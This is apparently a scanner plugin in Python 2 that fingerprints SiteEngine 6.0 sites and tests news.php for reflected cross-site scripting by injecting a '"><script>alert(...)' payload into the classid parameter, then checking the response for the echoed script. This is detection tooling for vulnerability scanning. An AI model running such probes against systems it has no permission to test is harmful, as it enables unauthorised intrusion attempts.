#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"admin/images/css.css")
        url+="news.php?pagestart=1&classid=1\"><script>alert(1333)</script>"
        r,c=requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if c.find("siteengine")>=0:
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and content.find('<script>alert(1333)</script>')>=0 and res.has_key('content-type') and res['content-type'] != '':
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:SITEENGINE6.0 news.php XSSSCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SITEENGINE6.0 news.php XSSSCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def